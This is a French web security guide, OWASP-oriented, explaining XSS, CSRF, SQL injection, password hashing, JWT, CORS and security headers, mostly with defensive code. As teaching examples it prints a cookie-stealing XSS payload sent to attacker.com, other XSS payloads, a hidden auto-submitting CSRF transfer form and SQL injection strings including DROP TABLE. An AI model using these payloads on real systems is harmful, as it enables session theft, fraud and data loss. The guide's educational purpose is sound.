# Guide Sécurité Web

## Introduction

La sécurité web est essentielle pour protéger les applications, les données des utilisateurs et l'intégrité des systèmes. Les vulnérabilités web peuvent conduire à des vols de données, des usurpations d'identité, des pertes financières et des atteintes à la réputation.

Ce guide couvre les principales vulnérabilités (OWASP Top 10) et les bonnes pratiques pour sécuriser les applications web modernes.

---

## XSS (Cross-Site Scripting)

### Qu'est-ce que le XSS ?

Le Cross-Site Scripting est une vulnérabilité qui permet à un attaquant d'injecter du code JavaScript malveillant dans une page web vue par d'autres utilisateurs. Ce code s'exécute dans le contexte du navigateur de la victime.

### Types de XSS

**1. Stored XSS (Persistant)**

Le script malveillant est stocké sur le serveur (base de données, fichiers) et affiché à tous les utilisateurs.

```html
<!-- Un utilisateur malveillant soumet ce commentaire -->
<script>document.location='https://attacker.com/steal?cookie='+document.cookie</script>

<!-- Le commentaire est affiché à tous les visiteurs -->
<!-- Leurs cookies sont envoyés à l'attaquant -->
```

**2. Reflected XSS**

Le script est inclus dans la requête et "réfléchi" dans la réponse.

```
# URL malveillante envoyée à la victime
https://example.com/search?q=<script>alert(document.cookie)</script>

# Si le serveur affiche le paramètre q sans échappement
# Le script s'exécute dans le navigateur de la victime
```

**3. DOM-based XSS**

Le script s'exécute côté client via manipulation du DOM, sans que les données passent par le serveur.

```javascript
// Code vulnérable
const userInput = window.location.hash.substring(1);
document.getElementById('output').innerHTML = userInput;

// URL malveillante
https://example.com/page#<img src=x onerror=alert(1)>
```

### Prévention du XSS

**1. Échapper les sorties HTML**

```javascript
// Fonction d'échappement
function escapeHtml(text) {
  const div = document.createElement('div');
  div.textContent = text;
  return div.innerHTML;
}

// Utilisation
const userInput = '<script>alert("xss")</script>';
element.innerHTML = escapeHtml(userInput);
// Résultat: &lt;script&gt;alert("xss")&lt;/script&gt;
```

**2. Utiliser textContent au lieu de innerHTML**

```javascript
// Vulnérable
element.innerHTML = userInput;

// Sécurisé
element.textContent = userInput;
```

**3. Content Security Policy (CSP)**

```http
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.cdn.com
```

**4. Frameworks avec échappement automatique**

- React : JSX échappe automatiquement
- Vue : Les templates sont échappés par défaut
- Angular : Sanitization automatique

```jsx
// React - sécurisé par défaut
function Comment({ text }) {
  return <p>{text}</p>; // text est échappé automatiquement
}

// Dangereux - à éviter
<div dangerouslySetInnerHTML={{ __html: userInput }} />
```

---

## CSRF (Cross-Site Request Forgery)

### Qu'est-ce que le CSRF ?

Le CSRF (aussi appelé "session riding") exploite la confiance qu'un site a envers le navigateur de l'utilisateur. Un attaquant fait exécuter des actions non désirées sur un site où la victime est authentifiée.

### Comment fonctionne le CSRF ?

```html
<!-- Page malveillante de l'attaquant -->
<html>
  <body>
    <!-- L'utilisateur connecté à bank.com visite cette page -->
    <img src="https://bank.com/transfer?to=attacker&amount=1000" />

    <!-- Ou avec un formulaire caché -->
    <form action="https://bank.com/transfer" method="POST" id="csrf-form">
      <input type="hidden" name="to" value="attacker" />
      <input type="hidden" name="amount" value="1000" />
    </form>
    <script>document.getElementById('csrf-form').submit();</script>
  </body>
</html>
```

### Protection contre le CSRF

**1. Tokens CSRF**

```html
<!-- Le serveur génère un token unique par session -->
<form action="/transfer" method="POST">
  <input type="hidden" name="_csrf" value="random-token-xyz123" />
  <input type="text" name="amount" />
  <button type="submit">Transfer</button>
</form>
```

```javascript
// Côté serveur (Express.js avec csurf)
const csrf = require('csurf');
app.use(csrf());

app.get('/form', (req, res) => {
  res.render('form', { csrfToken: req.csrfToken() });
});

app.post('/transfer', (req, res) => {
  // Le middleware vérifie automatiquement le token
});
```

**2. SameSite Cookies**

```http
Set-Cookie: sessionId=abc123; SameSite=Strict; Secure; HttpOnly
```

| Valeur | Comportement |
|--------|--------------|
| Strict | Cookie jamais envoyé en cross-site |
| Lax | Envoyé pour navigation GET, pas pour requêtes cross-origin |
| None | Toujours envoyé (nécessite Secure) |

**3. Vérifier l'en-tête Origin/Referer**

```javascript
app.post('/api/transfer', (req, res) => {
  const origin = req.headers.origin || req.headers.referer;
  if (!origin || !origin.startsWith('https://bank.com')) {
    return res.status(403).json({ error: 'Invalid origin' });
  }
  // Traiter la requête
});
```

---

## Injection SQL

### Qu'est-ce que l'injection SQL ?

L'injection SQL permet à un attaquant d'exécuter des requêtes SQL arbitraires en manipulant les entrées utilisateur non filtrées.

### Exemple d'injection SQL

```javascript
// Code vulnérable
const query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;

// Entrée malveillante
// username: admin'--
// password: anything

// Requête résultante
SELECT * FROM users WHERE username = 'admin'--' AND password = 'anything'
// Le -- commente le reste, l'attaquant se connecte sans mot de passe
```

**Autres exemples d'attaques :**

```sql
-- Extraction de données
' UNION SELECT username, password FROM users--

-- Suppression de données
'; DROP TABLE users;--

-- Bypass d'authentification
' OR '1'='1
```

### Prévention de l'injection SQL

**1. Prepared Statements (Requêtes paramétrées)**

```javascript
// Node.js avec PostgreSQL
const { rows } = await pool.query(
  'SELECT * FROM users WHERE username = $1 AND password = $2',
  [username, password]
);

// Node.js avec MySQL
const [rows] = await connection.execute(
  'SELECT * FROM users WHERE username = ? AND password = ?',
  [username, password]
);
```

**2. Utiliser un ORM**

```javascript
// Prisma
const user = await prisma.user.findFirst({
  where: {
    username: username,
    password: hashedPassword
  }
});

// Sequelize
const user = await User.findOne({
  where: { username, password: hashedPassword }
});
```

**3. Valider et assainir les entrées**

```javascript
// Valider que l'ID est bien un nombre
const userId = parseInt(req.params.id, 10);
if (isNaN(userId)) {
  return res.status(400).json({ error: 'Invalid ID' });
}
```

**4. Principe du moindre privilège**

```sql
-- Créer un utilisateur avec des droits limités
CREATE USER app_user WITH PASSWORD 'secret';
GRANT SELECT, INSERT, UPDATE ON users TO app_user;
-- Pas de DELETE, pas de DROP
```

---

## Authentification Sécurisée

### Hachage des mots de passe

**Ne jamais stocker les mots de passe en clair !**

```javascript
// Mauvais - stockage en clair
await db.query('INSERT INTO users (password) VALUES ($1)', [password]);

// Mauvais - hachage simple (reversible par rainbow tables)
const hash = crypto.createHash('sha256').update(password).digest('hex');

// Bon - bcrypt avec salt
const bcrypt = require('bcrypt');
const saltRounds = 12;
const hash = await bcrypt.hash(password, saltRounds);

// Vérification
const isValid = await bcrypt.compare(password, storedHash);
```

### Algorithmes recommandés

| Algorithme | Usage |
|------------|-------|
| bcrypt | Standard, bon équilibre sécurité/performance |
| Argon2 | Plus récent, gagnant de la Password Hashing Competition |
| scrypt | Résistant aux attaques par GPU |

```javascript
// Argon2
const argon2 = require('argon2');

// Hachage
const hash = await argon2.hash(password, {
  type: argon2.argon2id,
  memoryCost: 65536,
  timeCost: 3,
  parallelism: 4
});

// Vérification
const isValid = await argon2.verify(hash, password);
```

### Authentification à deux facteurs (2FA)

```javascript
// Génération du secret TOTP
const speakeasy = require('speakeasy');

const secret = speakeasy.generateSecret({
  name: 'MyApp:user@example.com'
});

// Générer le QR code pour l'application authenticator
const qrcode = require('qrcode');
const qrDataUrl = await qrcode.toDataURL(secret.otpauth_url);

// Vérification du code
const verified = speakeasy.totp.verify({
  secret: secret.base32,
  encoding: 'base32',
  token: userProvidedToken,
  window: 1 // Tolérance de ±30 secondes
});
```

---

## JWT (JSON Web Tokens)

### Structure d'un JWT

Un JWT se compose de trois parties séparées par des points :

```
header.payload.signature

eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.
eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.
SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

**Header** :
```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

**Payload** :
```json
{
  "sub": "user123",
  "name": "John Doe",
  "role": "admin",
  "iat": 1516239022,
  "exp": 1516242622
}
```

**Signature** :
```javascript
HMACSHA256(
  base64UrlEncode(header) + "." + base64UrlEncode(payload),
  secretKey
)
```

### Bonnes pratiques JWT

```javascript
const jwt = require('jsonwebtoken');

// Génération
const token = jwt.sign(
  { userId: user.id, role: user.role },
  process.env.JWT_SECRET,
  {
    expiresIn: '1h',        // Expiration courte
    algorithm: 'HS256',
    issuer: 'myapp.com',
    audience: 'myapp-users'
  }
);

// Vérification
try {
  const decoded = jwt.verify(token, process.env.JWT_SECRET, {
    algorithms: ['HS256'],  // Spécifier l'algorithme attendu
    issuer: 'myapp.com',
    audience: 'myapp-users'
  });
} catch (error) {
  if (error.name === 'TokenExpiredError') {
    // Token expiré
  } else if (error.name === 'JsonWebTokenError') {
    // Token invalide
  }
}
```

### Stockage des tokens

| Emplacement | Avantages | Inconvénients |
|-------------|-----------|---------------|
| localStorage | Simple | Vulnérable au XSS |
| Cookie HttpOnly | Protégé du XSS | Vulnérable au CSRF |
| Mémoire (variable) | Plus sécurisé | Perdu au refresh |

**Recommandation** : Cookie HttpOnly + SameSite + token CSRF

```http
Set-Cookie: token=eyJ...; HttpOnly; Secure; SameSite=Strict; Path=/
```

---

## CORS (Cross-Origin Resource Sharing)

### Same-Origin Policy

Par défaut, les navigateurs empêchent les requêtes vers un domaine différent (cross-origin). CORS permet de relaxer cette politique de manière contrôlée.

### Configuration CORS

```javascript
// Express.js
const cors = require('cors');

// Configuration permissive (développement)
app.use(cors());

// Configuration restrictive (production)
app.use(cors({
  origin: ['https://app.example.com', 'https://admin.example.com'],
  methods: ['GET', 'POST', 'PUT', 'DELETE'],
  allowedHeaders: ['Content-Type', 'Authorization'],
  credentials: true, // Pour envoyer les cookies
  maxAge: 86400 // Cache preflight pendant 24h
}));
```

### Headers CORS

```http
# Réponse du serveur
Access-Control-Allow-Origin: https://app.example.com
Access-Control-Allow-Methods: GET, POST, PUT, DELETE
Access-Control-Allow-Headers: Content-Type, Authorization
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 86400
```

### Requêtes Preflight

Pour les requêtes "complexes", le navigateur envoie d'abord une requête OPTIONS :

```http
OPTIONS /api/users HTTP/1.1
Origin: https://app.example.com
Access-Control-Request-Method: POST
Access-Control-Request-Headers: Content-Type, Authorization
```

---

## Headers de Sécurité

### Content-Security-Policy (CSP)

Contrôle les sources de contenu autorisées.

```http
Content-Security-Policy:
  default-src 'self';
  script-src 'self' https://cdn.example.com;
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;
  connect-src 'self' https://api.example.com;
  frame-ancestors 'none';
  base-uri 'self';
  form-action 'self'
```

### Autres headers importants

```http
# Empêcher le clickjacking
X-Frame-Options: DENY

# Empêcher le MIME sniffing
X-Content-Type-Options: nosniff

# Forcer HTTPS
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload

# Contrôle du referrer
Referrer-Policy: strict-origin-when-cross-origin

# Permissions features
Permissions-Policy: camera=(), microphone=(), geolocation=()
```

### Helmet.js (Express)

```javascript
const helmet = require('helmet');

app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", "'unsafe-inline'"],
      styleSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", "data:", "https:"]
    }
  },
  hsts: {
    maxAge: 31536000,
    includeSubDomains: true,
    preload: true
  }
}));
```

---

## FAQ - Questions Fréquentes

### Comment stocker les tokens de manière sécurisée ?

**Pour les applications web :**
1. Cookie HttpOnly + Secure + SameSite
2. Token d'accès court (15 min) + Refresh token long

**Pour les applications mobiles :**
1. Secure Storage (Keychain iOS, Keystore Android)
2. Ne jamais stocker en SharedPreferences/AsyncStorage

### Quelle différence entre authentication et authorization ?

**Authentication** (Authentification) : Vérifier l'identité
- "Qui êtes-vous ?"
- Login/password, OAuth, biométrie

**Authorization** (Autorisation) : Vérifier les permissions
- "Avez-vous le droit de faire cette action ?"
- Rôles, permissions, ACL

```javascript
// Middleware d'authentification
const authenticate = (req, res, next) => {
  const token = req.headers.authorization?.split(' ')[1];
  if (!token) return res.status(401).json({ error: 'Non authentifié' });

  const user = verifyToken(token);
  req.user = user;
  next();
};

// Middleware d'autorisation
const authorize = (...roles) => (req, res, next) => {
  if (!roles.includes(req.user.role)) {
    return res.status(403).json({ error: 'Non autorisé' });
  }
  next();
};

// Utilisation
app.delete('/users/:id', authenticate, authorize('admin'), deleteUser);
```

### Comment implémenter une politique de mots de passe ?

```javascript
const passwordSchema = {
  minLength: 12,
  minLowercase: 1,
  minUppercase: 1,
  minNumbers: 1,
  minSymbols: 1
};

function validatePassword(password) {
  const errors = [];

  if (password.length < passwordSchema.minLength) {
    errors.push(`Le mot de passe doit contenir au moins ${passwordSchema.minLength} caractères`);
  }
  if (!/[a-z]/.test(password)) {
    errors.push('Le mot de passe doit contenir au moins une minuscule');
  }
  if (!/[A-Z]/.test(password)) {
    errors.push('Le mot de passe doit contenir au moins une majuscule');
  }
  if (!/[0-9]/.test(password)) {
    errors.push('Le mot de passe doit contenir au moins un chiffre');
  }
  if (!/[!@#$%^&*]/.test(password)) {
    errors.push('Le mot de passe doit contenir au moins un caractère spécial');
  }

  // Vérifier les mots de passe communs
  if (commonPasswords.includes(password.toLowerCase())) {
    errors.push('Ce mot de passe est trop commun');
  }

  return errors;
}
```

---

## Ressources

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [OWASP Cheat Sheets](https://cheatsheetseries.owasp.org/)
- [MDN Web Security](https://developer.mozilla.org/en-US/docs/Web/Security)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [Helmet.js Documentation](https://helmetjs.github.io/)
- [Have I Been Pwned](https://haveibeenpwned.com/)
